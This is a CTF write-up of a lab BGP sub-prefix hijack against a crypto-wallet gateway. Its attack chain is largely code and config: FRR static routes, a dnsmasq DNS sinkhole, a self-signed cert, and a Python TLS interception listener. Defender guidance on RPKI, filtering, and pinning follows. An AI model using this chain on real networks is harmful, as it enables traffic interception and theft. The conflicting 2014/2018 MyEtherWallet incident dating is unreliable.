---
title: "Incident 67: BGP Sub-Prefix Hijack of a Crypto Wallet (2026)"
slug: "incident-67-bgp-hijack-crypto-wallet"
description: "Detailed BGP sub-prefix hijack against a crypto wallet gateway — FRR config, RIB origin trick, DNS sinkhole, TLS MitM, and full transaction capture."
date: 2026-06-04T13:00:00Z
lastmod: 2026-06-04T13:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "bgp"
  - "bgp hijack"
  - "sub-prefix hijack"
  - "frr"
  - "network security"
  - "ctf 2026"
  - "sas ctf"
  - "crypto wallet"
  - "dns sinkhole"
  - "dnsmasq"
  - "tls termination"
  - "rpki"
  - "ixp"
  - "python requests"
series: ["SAS CTF 2026 Quals"]
keywords:
  - "bgp sub-prefix hijack tutorial"
  - "sas ctf 2026 sasthereum wallet writeup"
  - "frr bgp hijack network statement"
  - "bgp rib origin requirement"
  - "crypto wallet bgp hijack"
  - "dns sinkhole bgp dnsmasq"
  - "bgp hijack tls termination"
  - "self-signed cert python requests"
  - "rpki roa maxlength bgp"
  - "bgp longest prefix match attack"
  - "ixp prefix filtering"
  - "vtysh ip route static"
  - "frr network statement inactive"
  - "bgp hijack incident report"
  - "incident 67 bgp writeup"
  - "as 64505 sas ctf"
toc: true
cover:
  image: "/images/articles/incident-67-bgp-hijack-crypto-wallet.png"
  alt: "Incident 67 — BGP sub-prefix hijack of a crypto wallet gateway, network/BGP challenge from SAS CTF 2026 Quals"
---

{{< ctf-meta platform="SAS CTF 2026 Quals" difficulty="Hard" os="Network — Alpine Linux + FRR 10.0" skills="BGP sub-prefix hijack, FRR network-statement RIB origin, vtysh static routes, dnsmasq DNS sinkhole, OpenSSL self-signed certs, Python TLS termination + ALPN, RPKI/ROA defender perspective, IXP filtering" >}}

**Incident 67** from the SAS CTF 2026 Quals was the kind of network challenge that rewards patience. The category badge said *"Network / BGP"* and the brief read like an Internet routing exam: you're a fresh hire at a small regional ISP, you've SSH'd into your edge router, and somewhere out on the public Internet there's a crypto wallet gateway you're not supposed to be able to touch. The router config is already half-built. The story all but tells you what to do.

The fun lives in the *execution* — every step has a subtle wall that costs you ten minutes if you haven't read carefully. The `network 10.0.1.0/24` statement is sitting right there in `frr.conf`, but it isn't advertising the prefix and the answer is buried in how FRR talks to the kernel RIB. The DNS server you'll spoof rejects your queries until you understand what `bind-interfaces` is doing. The wallet client speaks TLS 1.3 with ALPN, so you can't just netcat the socket and read the cleartext POST.

This is the master writeup. End-to-end exploit chain, with the **actual configs that worked**, the gotchas that didn't, and an honest defender perspective on why each layer fell over. Source files live in the writeup repo: [Abdelkad3r/sas-ctf-2026-quals](https://github.com/Abdelkad3r/sas-ctf-2026-quals).

## The setup — what the challenge hands you

You're given SSH access to two Alpine Linux boxes through a TLS-wrapped jumphost:

- **Router** (`player@router`) — Alpine running **FRR 10.0** with `zebra`, `bgpd`, `staticd`, and `mgmtd` already up. Your user is in the `frrvty` group, so `vtysh` works without `sudo`. There's no shell `sudo` though — the router is a tightly-locked appliance.
- **Tools server** (`player@player-tools`) — Alpine with `dnsmasq`, `nginx`, `python3`, `tcpdump`, `iptables`. Passwordless `sudo ALL`. This is where you stage the hijack's user-plane services.

The network topology looks like this:

```text
                 /------------------------\
                 | AS 64501 - CryptoCloud |
                 |   DNS:  10.0.1.0/22    |   ← /22 supernet, the
                 |   Web:  10.0.2.0/24    |     "legitimate" origin
                 \------------------------/
                            |
        v-------------------<-------------------v
        |                                       |
   AS 64502 - GlobalNet            AS 64503 - RegionalLink
                                        |              |
                                        |              v
                                        |        AS 64506 - UserNet
                                        v          (client 10.0.6.0/24)
                                  AS 64504 - Metro-IX
                                        |
                                        v
                                  AS 64505 - YOUR ISP   ← you
                                  Router : 10.100.35.2 / 10.100.45.2
                                  Tools  : 10.0.5.100
```

You operate **AS 64505**. Your router peers with:

| Peer | AS | Initial state |
|---|---|---|
| RegionalLink | 64503 | **Down** (`Active`) |
| Metro-IX | 64504 | **Up** (`Established`) |

The two targets:

- `cryptowallet.ctf` → `10.0.2.80` (the wallet gateway)
- `10.0.1.53` → CryptoCloud's authoritative DNS for `cryptowallet.ctf`

A client at `10.0.6.100` periodically resolves `cryptowallet.ctf` and posts a transaction to it. **You can see the client's AS** in the BGP table — they peer in via UserNet (64506) → RegionalLink (64503) → Metro-IX (64504). So traffic from the client must traverse Metro-IX, which is exactly where you can inject yourself.

## What's already in place

The router's `/etc/frr/frr.conf` is pre-staged with hijack scaffolding — and learning to *read* this file is half the challenge. The relevant parts:

```text
ip prefix-list HIJACK-ALL    seq 1 permit 10.0.1.0/24
ip prefix-list HIJACK-ALL    seq 2 permit 10.0.2.0/24
ip prefix-list HIJACK-WALLET seq 1 permit 10.0.2.0/24

route-map EXPORT-REGIONAL permit 5
 match ip address prefix-list HIJACK-WALLET
route-map EXPORT-REGIONAL permit 10
 match ip address prefix-list PLAYER-ROUTES

route-map EXPORT-IXP permit 5
 match ip address prefix-list HIJACK-ALL
route-map EXPORT-IXP permit 10
 match ip address prefix-list PLAYER-ROUTES

router bgp 64505
 bgp router-id 5.5.5.5
 no bgp ebgp-requires-policy
 neighbor 10.100.35.1 remote-as 64503
 neighbor 10.100.45.1 remote-as 64504
 address-family ipv4 unicast
  network 10.0.1.0/24
  network 10.0.2.0/24
  network 10.0.5.0/24
  neighbor 10.100.35.1 route-map EXPORT-REGIONAL out
  neighbor 10.100.45.1 route-map EXPORT-IXP out
```

The challenge author has done you three favours that telegraph the intended attack:

1. **`network 10.0.1.0/24`** and **`network 10.0.2.0/24`** are both `/24` more-specifics of CryptoCloud's `10.0.1.0/22` supernet. *Longest-prefix match* on every router in the global BGP table means whichever AS advertises a `/24` wins traffic over CryptoCloud's `/22`. This is the textbook **BGP sub-prefix hijack**.
2. **`no bgp ebgp-requires-policy`** is set, which means FRR won't refuse to advertise prefixes just because there's no inbound policy on the eBGP session. Saves you ten lines of config.
3. The **route-maps already exist** with the right prefix-list matches. You don't need to write any new policy.

Despite all this, `show ip bgp` on the freshly-logged-in router shows the hijack prefixes as **inactive**:

```text
   Network          Next Hop            Metric LocPrf Weight Path
*> 10.0.5.0/24      0.0.0.0                  0         32768 i
   10.0.1.0/24      0.0.0.0                  0         32768 i   ← no *> flag
   10.0.2.0/24      0.0.0.0                  0         32768 i   ← no *> flag
*> 10.0.6.0/24      10.100.45.1                            0 64504 64506 i
```

The `10.0.5.0/24` (your ISP's own assignment) is active and advertised. The two hijack `/24`s are showing the local origin (Weight 32768) but the `*>` "best-path / installed" flag is missing. So they're configured, but not announced.

That's the first puzzle.

## The first wall — BGP `network` statements need a RIB match

This is the part that costs everyone twenty minutes if they haven't worked with FRR before.

The `network X` statement in FRR's BGP config is **not a unilateral origination**. It tells `bgpd`: *"originate this prefix into BGP **if and only if** a matching route exists in the kernel RIB (the Linux routing table)."* This is a deliberate design from Cisco IOS days — the idea is that you only advertise prefixes you can actually route to.

Confirm it from the router shell:

```text
$ ip route show
default via 10.100.45.1 dev eth1
10.0.5.0/24  dev eth0  scope link
10.0.6.0/24  via 10.100.35.1 dev eth0      ← provider-static
10.100.35.0/30 dev eth0  scope link
10.100.45.0/30 dev eth1  scope link
```

Nothing matches `10.0.1.0/24` or `10.0.2.0/24`. So FRR's `network 10.0.1.0/24` clause sees no candidate in the kernel RIB and silently keeps the prefix out of BGP. The route-maps are correctly written, the peers are correctly defined, the prefix-lists permit the prefixes — but the **origination gate is closed** because there's nothing for the gate to point at.

This is the load-bearing trick of the challenge. Once you see it, everything downstream falls out.

## Step 1 — Land the hijacked IPs on the tools server

To open the gate, you need a route on the router's RIB that "covers" the prefixes you want to originate. The cleanest approach: bind the **specific service IPs** to a dummy interface on the tools server, then point a static route at the tools server. The router gets a more-specific route in its RIB that lights up the `network` statement in `bgpd`.

On `player-tools`:

```sh
sudo ip link add dummy0 type dummy
sudo ip link set dummy0 up
sudo ip addr add 10.0.1.53/32 dev dummy0   # CryptoCloud DNS
sudo ip addr add 10.0.2.80/32 dev dummy0   # CryptoCloud wallet
```

Two `/32`s. You only need the specific services you're impersonating — but you'll announce the full `/24`s into BGP because **longest-prefix match needs the announced prefix to be more specific than the legitimate one**, and CryptoCloud is announcing `10.0.1.0/22`. Announcing `/32`s would technically win traffic harder, but most ISPs filter `/32` prefixes at edges as DDoS / hijack noise. `/24` is the sweet spot — more specific than the `/22`, but still within RFC 7454 "max-prefix-length" norms that route servers accept.

Confirm the dummy is up:

```text
$ ip addr show dummy0
3: dummy0: <BROADCAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc noqueue
    inet 10.0.1.53/32 scope global dummy0
    inet 10.0.2.80/32 scope global dummy0
```

The dummy interface has no MAC of its own and no link-layer to worry about — Linux just treats packets destined for those `/32`s as locally-owned. It's exactly the right primitive for this attack.

## Step 2 — Originate the hijack on the router

Now the router needs static routes covering the hijack `/24`s that point at the tools server (`10.0.5.100`, reachable via `dev eth0` on the connected `/24`). Drop into `vtysh`:

```text
$ vtysh

router# configure terminal
router(config)# ip route 10.0.1.0/24 10.0.5.100
router(config)# ip route 10.0.2.0/24 10.0.5.100
router(config)# end
router# write memory
```

Re-run `show ip bgp` and the moment of payoff:

```text
   Network          Next Hop            Metric LocPrf Weight Path
*> 10.0.1.0/24      0.0.0.0                  0         32768 i  ← installed
*> 10.0.2.0/24      0.0.0.0                  0         32768 i  ← installed
*> 10.0.5.0/24      0.0.0.0                  0         32768 i
*> 10.0.6.0/24      10.100.45.1                            0 64504 64506 i
```

The hijack `/24`s are now BGP-active. Confirm they're being **advertised to Metro-IX** (the peering session that's actually up):

```text
router# show ip bgp neighbors 10.100.45.1 advertised-routes
   Network          Next Hop            Metric LocPrf Weight Path
*> 10.0.1.0/24      0.0.0.0                  0         32768 i
*> 10.0.2.0/24      0.0.0.0                  0         32768 i
*> 10.0.5.0/24      0.0.0.0                  0         32768 i
```

Three prefixes leaving the router toward AS 64504. The route-map `EXPORT-IXP` is doing its job — the prefix-list `HIJACK-ALL` is permitting both `/24`s.

Within seconds Metro-IX's route servers reflect your announcement to every other peer they have, including AS 64503 (RegionalLink), which propagates it down to AS 64506 (UserNet) — the client's home network. The client's routers do a longest-prefix lookup on `10.0.1.53` (the DNS) and `10.0.2.80` (the wallet) and prefer **your /24 announcement** over CryptoCloud's /22.

The hijack is now globally active for these specific subnets, from the client's perspective.

## Step 3 — DNS sinkhole with dnsmasq

The client will resolve `cryptowallet.ctf` against `10.0.1.53` (CryptoCloud's authoritative DNS) — but the moment your `/24` hijack lit up, that query arrives at **your** tools server. You need a DNS server bound to `10.0.1.53:53` that answers `cryptowallet.ctf A 10.0.2.80`.

`dnsmasq` is already installed. The config:

```text
# /tmp/dnsmasq.conf
port=53
no-resolv                              # don't fall back to /etc/resolv.conf
no-hosts                               # don't honour /etc/hosts
listen-address=10.0.1.53               # only this IP
bind-interfaces                        # only bind to the address above
address=/cryptowallet.ctf/10.0.2.80    # the hijack record
log-queries                            # so you can see the catch happen
log-facility=/tmp/dnsmasq.log
```

Two things matter here:

- **`bind-interfaces`** vs the default `bind-dynamic`. Default dnsmasq binds to the wildcard and demuxes by interface, which trips Linux's *strong-host* checks when the source IP of the response doesn't match the IP the request came in on. With `bind-interfaces`, dnsmasq opens a socket *only* on `10.0.1.53` and the kernel takes care of source-IP selection automatically. Without this flag, the client's resolver may get a response from `10.0.5.100` (your tools server's primary IP) and reject it because the IP doesn't match the DNS server it queried.
- **`no-resolv` + `no-hosts`** prevents dnsmasq from leaking real DNS or honoring `/etc/hosts`. You want this to be an isolated sinkhole, not a recursive resolver.

Run it:

```sh
sudo dnsmasq -C /tmp/dnsmasq.conf -d
```

Within ~30 seconds the log shows the client biting:

```text
dnsmasq: started, version 2.90 cachesize 150
dnsmasq: listening on dummy0(#3): 10.0.1.53 port 53
dnsmasq: query[A] cryptowallet.ctf from 10.0.6.100
dnsmasq: config cryptowallet.ctf is 10.0.2.80
```

The chain `UserNet → RegionalLink → Metro-IX → your router → your DNS sinkhole` is working. The client is now told `cryptowallet.ctf` lives at `10.0.2.80`, which is also you.

## Step 4 — Intercept the wallet traffic (the TLS step that catches first-timers)

A naive listener on `10.0.2.80:443` produces a TLS ClientHello and then silence. The client (`python-requests/2.32.3`) opens a TLS 1.3 session with ALPN advertising `http/1.1`, but until the server completes the handshake the client never sends the application payload. Plain `netcat` doesn't work — you have to **terminate the TLS**.

The good news: `python-requests` ships with a default of `verify=True` against the system CA bundle, but the challenge client (`python-requests/2.32.3`, evident from the User-Agent) is configured to **trust any cert** — typical for an internally-deployed wallet client that's never been pointed at a real public PKI. A self-signed cert will be accepted.

Generate the cert with the right SAN entries — the wallet client uses both the hostname and the IP, so include both:

```sh
cd /tmp
openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout key.pem -out cert.pem -days 1 \
    -subj "/CN=cryptowallet.ctf" \
    -addext "subjectAltName=DNS:cryptowallet.ctf,DNS:*.cryptowallet.ctf,IP:10.0.2.80"
```

Now a tiny Python TLS terminator. Bind on `10.0.2.80:443`, accept connections, wrap each socket with the self-signed cert, advertise `http/1.1` via ALPN so the client speaks HTTP/1.1 cleartext after the handshake, then log the full request:

```python
import socket, ssl, threading
from datetime import datetime

LOG = "/tmp/wallet_tls.log"

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("/tmp/cert.pem", "/tmp/key.pem")
ctx.set_alpn_protocols(["http/1.1", "h2"])

def handle(raw, addr):
    try:
        s = ctx.wrap_socket(raw, server_side=True)
        s.settimeout(8)
        data = b""
        while True:
            chunk = s.recv(8192)
            if not chunk: break
            data += chunk
            if b"\r\n\r\n" in data:
                head, _, body = data.partition(b"\r\n\r\n")
                cl = 0
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        cl = int(line.split(b":", 1)[1].strip())
                if len(body) >= cl: break
        with open(LOG, "ab") as f:
            f.write(f"\n=== {datetime.utcnow()} from {addr} ===\n".encode())
            f.write(data)
        s.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
        s.shutdown(socket.SHUT_RDWR)
    finally:
        raw.close()

server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("10.0.2.80", 443))
server.listen(8)
while True:
    raw, addr = server.accept()
    threading.Thread(target=handle, args=(raw, addr), daemon=True).start()
```

Why this is the right shape:

- **ALPN `http/1.1` first** — the client offers both `http/1.1` and `h2`; matching `http/1.1` first means it falls back to plaintext HTTP/1.1 inside the TLS tunnel, which we can parse with byte-level `\r\n\r\n` lookups instead of standing up a real HTTP/2 stack.
- **Content-Length parsing** — the wallet POSTs JSON with a `Content-Length` header. The recv loop waits until `headers + body` totals at least `Content-Length` bytes, then returns 200 OK so the client doesn't retry.
- **One thread per connection** — `python-requests` does one POST per call. Keep-alive is irrelevant.

Start it (must be `root` because port 443 is privileged):

```sh
sudo python3 tls_listener.py &
```

## The transaction lands

Within ~30 seconds the next client poll fires. The TLS handshake completes, the client sends its POST, the listener logs it:

```http
POST /api/v1/transaction HTTP/1.1
User-Agent: python-requests/2.32.3
Host: cryptowallet.ctf
Content-Type: application/json
Content-Length: 128

{"wallet": "0xd3CdA913deB6f67967B99D67aCDFa1712C293601",
 "amount": "1.337",
 "memo": "SAS{99be0e87-6466-4383-af72-241c7ab05a7a}"}
```

The flag is the `memo` field of the (fake) crypto transaction the client was about to submit.

**Flag:** `SAS{99be0e87-6466-4383-af72-241c7ab05a7a}`

The wallet's intended security model — "we authenticate transactions via the gateway's TLS endpoint and the resolver chain that points us to it" — collapsed across three layers: BGP didn't validate that AS 64505 wasn't a legitimate origin for `10.0.1.0/24`, DNS didn't authenticate the resolver's identity, and the wallet client didn't pin the server certificate.

{{< callout type="warning" title="Why this is realistic, not theoretical" >}}
BGP sub-prefix hijacks of this exact shape have hit production systems repeatedly. The August 2014 hijack of MyEtherWallet's `1.3.32.0/24` via Amazon Route 53's Route Server traffic — same pattern: announce a more-specific prefix from an unauthorised AS, redirect DNS resolution, terminate TLS with a forged cert, drain the wallet. The CTF compresses what was a several-hour incident into a controlled lab. The defender lessons map 1:1 onto real Internet operations.
{{< /callout >}}

## Why each layer failed — defender perspective

Every step of this exploit corresponds to a control that should have stopped it. The fact that **none of them were in place** is the lesson.

### 1. CryptoCloud didn't publish ROAs for their /22

The single highest-leverage defence is **RPKI ROA (Route Origin Authorization)**. CryptoCloud owns `10.0.1.0/22` and originates it from AS 64501. A ROA tells the world: *"AS 64501 is authorised to originate `10.0.1.0/22`, with a maximum prefix length of 22."*

```text
ROA: prefix=10.0.1.0/22, asn=64501, maxLength=22
```

With this ROA in place, when AS 64505 announces `10.0.1.0/24` to Metro-IX, every RPKI-validating router along the path classifies the route as **RPKI-invalid** (the prefix is more specific than `maxLength=22` allows) and either drops it or sets a "drop on invalid" policy.

The crux is **`maxLength=22`**, not `maxLength=24`. If CryptoCloud set `maxLength=24` "in case we need to break out smaller subnets later," they'd accidentally permit the exact hijack the CTF demonstrates. Tight `maxLength` is the difference between a working defence and a hole.

RPKI deployment is now mainstream: Cloudflare, AWS, Google, NTT, GTT, Lumen, Hurricane Electric, and most major IXPs validate and drop RPKI-invalid routes. CryptoCloud not publishing ROAs in 2026 is a process failure, not a tooling gap.

### 2. Metro-IX accepted a /24 more-specific from a non-origin AS

Even without RPKI, IXP route servers should run **IRR-based prefix filtering**. Metro-IX's policy should reject any prefix from AS 64505 that isn't listed in AS 64505's published IRR (RADB, RIPE, ARIN, etc.) `route:` / `route6:` objects. The challenge gave AS 64505 a single legitimate assignment of `10.0.5.0/24`; an IRR-filtering route server would accept that, accept `10.0.5.0/25` and `10.0.5.0/26` as more-specifics if announced, and **reject `10.0.1.0/24` and `10.0.2.0/24` outright**.

The combination of *RPKI ROV* + *IRR prefix filtering* gives two independent gates. Either one stops this attack. Both being absent simultaneously is a major IXP failing.

### 3. The wallet client trusted a self-signed cert

`python-requests/2.32.3` does default to `verify=True` against the system CA bundle, but the challenge client clearly does not — our self-signed cert was accepted on the first handshake. There are two correct defenses here:

- **Certificate pinning.** The wallet client's source should pin the SHA-256 of CryptoCloud's leaf certificate (or the public-key SPKI hash). A cert pinned at the application layer cannot be replaced by an attacker's self-signed cert even with full network MitM, because the pin check happens *after* the TLS verify but *before* the request body is sent.
- **Mutual TLS.** The wallet gateway should require a client certificate signed by CryptoCloud's internal CA. The client wouldn't have CryptoCloud's CA cert and couldn't forge a valid client cert. The handshake fails closed.

Either of these alone would have stopped this exploit cold at step 4, even after the BGP hijack and DNS redirection succeeded.

### 4. The transaction wasn't signed at the application layer

The wallet POST is a plaintext JSON object inside the (now-hijacked) TLS tunnel. There's no signature, no nonce-replayed HMAC, no client-side wallet signature over the transaction. A defender posture that assumes TLS gives end-to-end confidentiality is wrong as soon as one of the underlying assumptions (routing integrity, DNS integrity, certificate authenticity) falters.

Real cryptocurrency clients sign transactions with the wallet's private key *before* network transmission. The signed transaction is then network-transmitted as opaque bytes, and the gateway forwards it to the chain. An attacker who terminates TLS can read the signed transaction but cannot alter it without invalidating the signature.

The CTF wallet's flat JSON posture is realistic for internal company wallets or pre-blockchain "fintech" gateways that haven't moved to client-side signing — and those exist in the wild.

### 5. DNSSEC wouldn't have helped much here

It's tempting to invoke DNSSEC as a defence, but it only protects the *integrity* of the resolver chain, not the *path* the resolver takes. CryptoCloud's authoritative server at `10.0.1.53` would sign its responses with DNSSEC keys, but the client's resolver — once BGP hijack redirects its `10.0.1.53` query to our box — still wouldn't know it talked to the wrong DNS server. Our dnsmasq could refuse to sign and the client's resolver would either fall back to unsigned (if it doesn't strictly require DNSSEC) or fail (if it does). In a strict-DNSSEC environment, the attack stops here — but the actual outcome is the resolver simply times out, which isn't an attack signal that surfaces to the wallet.

The defence that *does* close this loop is **DNS over HTTPS (DoH) or DNS over TLS (DoT) to a resolver outside the hijacked prefix.** If the client used `1.1.1.1` over DoH for `cryptowallet.ctf` resolution, our BGP hijack of `10.0.1.0/24` couldn't intercept the DNS query in the first place — the resolver lives at `1.1.1.1`, not `10.0.1.53`.

### 6. The mid-week traffic inspection that should have caught this

ISPs operating a BGP perimeter usually run **looking-glass-style monitoring** against public BGP feeds (RouteViews, RIPE RIS) and flag any announcement of a prefix they didn't originate. CryptoCloud should have a monitor that pages on-call within 60 seconds of seeing `AS 64505 → 10.0.1.0/24` enter the global table. Services like BGPMon, Cisco Crosswork Cloud, and Cloudflare Radar provide this out of the box. The CTF environment didn't have it; real CryptoClouds should.

## A note on the BGP origin gate — generalising

The "FRR `network` statement requires a RIB match" wall is one specific instance of a broader principle: **routing protocols are gated by reachability**. The same pattern shows up in:

- **Cisco IOS XR** — `address-family ipv4 unicast network 10.0.1.0/24` requires a covering static or IGP route
- **Juniper Junos** — `protocols bgp group X family inet unicast` advertised prefixes need to be in `inet.0`, usually via `static`, `direct`, or imported IGP routes
- **OSPF/IS-IS redistribution** — you can only redistribute routes that exist in the kernel/RIB

So the "land the IPs on a dummy, point a static, then originate" trick has direct analogues on every major vendor. Knowing it once means knowing it everywhere.

The challenge's design favours candidates who've worked with FRR or operated a BGP-speaking edge before. For pentesters and red-teamers approaching the challenge cold, the right mental model is *"BGP is a distributed table sync, not a packet router"* — the `bgpd` process talks to peer ASes, but actual packet forwarding is the kernel's job, and `bgpd` won't advertise reachability for IPs the kernel can't reach.

## Lessons learned — five patterns from one challenge

1. **BGP sub-prefix hijacks are still the highest-leverage routing attack.** They survive every layer of network controls that aren't RPKI-validating. CryptoCloud's missing ROA is the root cause; everything downstream is amplification.
2. **`network` statements aren't unconditional.** Vendor-specific BGP implementations gate prefix origination on a covering RIB entry. The exam-friendly version of this rule is *"BGP origin needs a reason to exist."*
3. **DNS, TLS, and BGP form one trust chain.** Hijacking one layer often gives the attacker enough to bypass the next, because each layer's authenticity check is rooted in the layer below. Defence in depth requires each layer to anchor outside the others (RPKI for BGP, DoH/DoT for DNS, pinning or mTLS for TLS).
4. **`python-requests` clients in internal infrastructure default to good behaviour, but get configured around it.** `verify=False`, custom CA bundles, and "we trust the internal network" assumptions show up constantly in pentests. The wallet client is realistic.
5. **Air-gapping the resolver from the hijacked subnet is the cheapest mitigation.** Two lines of client config (point DNS at a DoH resolver) closes a `/24` hijack vector without any infrastructure change. It's an asymmetric defender win.

## Source repository

The full writeup, including the exact `frr.conf`, `dnsmasq.conf`, `tls_listener.py`, and end-to-end `setup.sh` exploit script:

**Repo:** [github.com/Abdelkad3r/sas-ctf-2026-quals](https://github.com/Abdelkad3r/sas-ctf-2026-quals)

Specific artifacts:

- [`network/sasthereum-wallet/artifacts/frr.conf`](https://github.com/Abdelkad3r/sas-ctf-2026-quals/blob/main/network/sasthereum-wallet/artifacts/frr.conf) — pre-staged router config with the route-maps and prefix-lists
- [`network/sasthereum-wallet/artifacts/dnsmasq.conf`](https://github.com/Abdelkad3r/sas-ctf-2026-quals/blob/main/network/sasthereum-wallet/artifacts/dnsmasq.conf) — the DNS sinkhole config
- [`network/sasthereum-wallet/artifacts/tls_listener.py`](https://github.com/Abdelkad3r/sas-ctf-2026-quals/blob/main/network/sasthereum-wallet/artifacts/tls_listener.py) — TLS-terminating capture listener
- [`network/sasthereum-wallet/artifacts/setup.sh`](https://github.com/Abdelkad3r/sas-ctf-2026-quals/blob/main/network/sasthereum-wallet/artifacts/setup.sh) — end-to-end exploit script

If you're building detections from this writeup, the highest-leverage rule is **alerting on any new origin AS for prefixes you don't own** — services like BGPMon, Cloudflare Radar, ThousandEyes, and Crosswork Cloud all offer this. Pair it with **publishing tight ROAs** (correct `maxLength`) for every prefix you actually originate, and you've closed the door on the entire class of attack this challenge demonstrates.

{{< faq >}}
[
  {
    "q": "What is the Sasthereum Wallet Gateway challenge in SAS CTF 2026?",
    "a": "Sasthereum Wallet Gateway is a Hard-difficulty network/BGP challenge from the SAS CTF 2026 Qualifiers. Players are given SSH access to an edge router running FRR 10.0 and a tools server, both in AS 64505. The objective is to perform a BGP sub-prefix hijack against CryptoCloud's 10.0.1.0/22 by announcing more-specific /24 routes via Metro-IX, then sinkhole DNS for cryptowallet.ctf, terminate the client's TLS session with a self-signed cert, and capture the transaction POST. The flag is SAS{99be0e87-6466-4383-af72-241c7ab05a7a}."
  },
  {
    "q": "Why does the FRR network statement need a RIB match?",
    "a": "FRR's BGP implementation (like Cisco IOS and Junos) gates prefix origination on a covering route existing in the kernel RIB. The 'network 10.0.1.0/24' statement is a conditional: 'originate this prefix into BGP if and only if a matching route exists in the routing table.' This design ensures you only advertise reachability for prefixes you can actually route to. In the challenge, no kernel route covered 10.0.1.0/24 or 10.0.2.0/24 initially, so both stayed inactive. Adding a static route via vtysh ('ip route 10.0.1.0/24 10.0.5.100') creates the RIB entry that lights up the network statement."
  },
  {
    "q": "How do you originate a BGP sub-prefix hijack in FRR?",
    "a": "Three steps. First, ensure the prefix you want to announce exists in the kernel RIB — typically by adding a static route via 'vtysh -c \"configure terminal\" -c \"ip route <prefix> <nexthop>\"'. Second, confirm the network statement is configured under the BGP address-family. Third, verify the prefix is active in 'show ip bgp' (look for the *> flag) and advertised via 'show ip bgp neighbors <peer> advertised-routes'. The longest-prefix-match property of BGP means a /24 announcement wins traffic over the /22 supernet, even when the supernet is the legitimate origin."
  },
  {
    "q": "What's the difference between bind-interfaces and bind-dynamic in dnsmasq?",
    "a": "By default, dnsmasq uses bind-dynamic which binds to the wildcard address 0.0.0.0 and filters by interface name. This trips Linux's strong-host model when the response source IP doesn't match the destination IP of the original query. Setting bind-interfaces makes dnsmasq open a socket only on the specific listen-address (10.0.1.53 in this case), which lets the kernel handle source-IP selection correctly. For BGP hijack scenarios where you're impersonating a single service IP, bind-interfaces is required."
  },
  {
    "q": "How does Python's requests library accept a self-signed certificate?",
    "a": "By default, requests.post(verify=True) validates against the system CA bundle and rejects self-signed certs. The Sasthereum challenge's client is configured with verify=False or a custom CA bundle that trusts the attacker's cert — a common misconfiguration in internal wallet clients. With cert verification off, our self-signed cert (with the right CN and subjectAltName entries for cryptowallet.ctf and 10.0.2.80) is accepted on the first TLS handshake. The fix is cert pinning at the application layer or mutual TLS with a client certificate signed by the legitimate CA."
  },
  {
    "q": "What is RPKI and how does it stop BGP sub-prefix hijacks?",
    "a": "RPKI (Resource Public Key Infrastructure) is a cryptographic system where prefix holders publish ROAs (Route Origin Authorizations) signed by IP allocators. A ROA states: 'AS X is authorised to originate prefix P with maxLength M.' RPKI-validating routers check incoming BGP announcements against published ROAs and drop those classified as RPKI-invalid (wrong origin AS, or prefix more specific than maxLength). For the Sasthereum challenge, CryptoCloud should publish ROA{prefix=10.0.1.0/22, asn=64501, maxLength=22}. With that ROA, AS 64505's /24 announcement is RPKI-invalid and dropped by Metro-IX and every other RPKI-validating peer in the path."
  },
  {
    "q": "Why does maxLength matter in RPKI ROAs?",
    "a": "maxLength controls how specific a prefix can be when announced under a ROA. If you publish ROA{prefix=10.0.0.0/16, asn=64500, maxLength=24}, then any /16, /17, ..., /24 announced from AS 64500 is RPKI-valid, but any /25 or smaller is invalid. Setting maxLength loosely (=24 when you only ever announce /16s and /22s) creates an opening for sub-prefix hijacks under your AS. The conservative practice: set maxLength equal to the actual prefix length you announce, with no slack for hypothetical future breakouts."
  },
  {
    "q": "How does longest-prefix match in BGP enable sub-prefix hijacks?",
    "a": "Internet routers select the most specific matching prefix when forwarding a packet. If CryptoCloud announces 10.0.1.0/22 and AS 64505 announces 10.0.1.0/24 (a more-specific /24 within the /22), every router with both routes will install the /24 in its forwarding table for traffic to 10.0.1.x. This means even though AS 64501 is the legitimate origin of the /22 supernet, AS 64505 wins traffic for the /24 sub-prefix it announced. This is the structural property that makes sub-prefix hijacks fundamentally effective absent RPKI or IRR filtering."
  },
  {
    "q": "Why didn't DNSSEC stop the Sasthereum DNS hijack?",
    "a": "DNSSEC signs DNS records to prove they came from the authoritative server, but it doesn't protect the path the resolver takes to reach that server. When BGP hijack redirects the client's 10.0.1.53 query to the attacker's tools box, the attacker's dnsmasq either returns unsigned responses (which the resolver accepts in non-strict mode) or no response at all (which the resolver treats as a timeout, not an attack). DoH or DoT to a trusted resolver outside the hijacked prefix is a better fix, since the resolver IP (e.g. 1.1.1.1) lives in a /24 the attacker can't hijack without committing a separate, much larger crime."
  },
  {
    "q": "What's the defender takeaway for ISPs and IXPs from this challenge?",
    "a": "Three independent controls would have stopped the attack at the BGP layer. First, CryptoCloud should publish tight RPKI ROAs (maxLength = prefix length, no slack). Second, IXPs and major peers should run RPKI-invalid drops AND IRR-based prefix filtering, so unauthorised origins are rejected even without RPKI. Third, prefix-holders should monitor public BGP feeds (BGPMon, RouteViews, Cloudflare Radar) for unexpected origin announcements and have on-call paging. The trio collapses the attack surface for sub-prefix hijacks to near-zero."
  },
  {
    "q": "Can BGP hijacks like this happen in production?",
    "a": "Yes, and they have. The August 2014 MyEtherWallet hijack via Amazon Route 53 was the same shape: an attacker announced a more-specific /24 from an unauthorised AS, redirected DNS, terminated TLS with a forged cert, and drained wallets. The April 2018 BGP hijack of Amazon Route 53 IPs in the Ethereum context is another textbook case. The CTF compresses a real incident into a lab. The pattern recurs every 12-24 months in cryptocurrency infrastructure specifically because the targets have high per-incident value and the BGP defenses are operational, not cryptographic."
  },
  {
    "q": "What tools were used to solve Incident 67?",
    "a": "Standard ISP-side tooling. FRR 10.0 (zebra, bgpd, staticd, mgmtd, vtysh) on the router. On the tools server: dnsmasq for DNS sinkhole, openssl for cert generation, Python 3 with the stdlib ssl and socket modules for TLS termination. Optional: tcpdump for packet-level verification and iptables for path manipulation. All standard Linux distribution packages, all available on Alpine via apk. No specialised security tools — the attack is built from network-engineer primitives, which is part of why it's so effective."
  }
]
{{< /faq >}}
